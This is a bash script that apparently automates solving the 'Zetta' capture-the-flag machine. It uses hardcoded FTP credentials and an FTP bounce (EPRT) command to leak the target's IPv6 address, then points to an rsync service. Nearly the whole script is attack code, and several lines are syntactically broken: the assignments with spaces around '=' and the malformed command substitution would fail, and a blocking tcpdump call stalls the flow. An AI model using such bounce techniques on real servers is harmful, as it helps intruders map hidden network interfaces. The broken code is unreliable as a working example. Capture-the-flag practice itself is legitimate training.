#!/bin/bash


echo -e "[+]Solving the zetta box! This will dump a lot of information! If you want to avoid this better write the script yourself or get the fuck off\n[+]IP of the box: 10.10.10.156\nWe will be trying to recover the ipv6 via FTP bounce attack!\n"

username = "2katKRCwAaL6mLknJDULMgifjMr61Cy9"  #In case you are wondering how it came.. learn to see the source code
password = "2katKRCwAaL6mLknJDULMgifjMr61Cy9"

ipv6 = (ifconfig tun0 | grep 'inet6' -m 1 | cut -d ' ' -f 10)
echo -e "[+]Your ipv6 address : $ipv6\nStarting the tcpdump to capture reqeust\n"

tcpdump -i tun0 -vv ip6

ftp 10.10.10.156 << EOF
quote USER $username
quote PASS $password
quote "|2|$ipv6|2121|"
quote list
EOF

echo -e "[!]Look at the tcpdump and enter the ipv6 address of the box here:\n"
read box_ipv6

echo -e "[+]IPV6 of target: $box_ipv6\nConnecting to rsync server at port 8730(perform nmap scan on ipv6)"




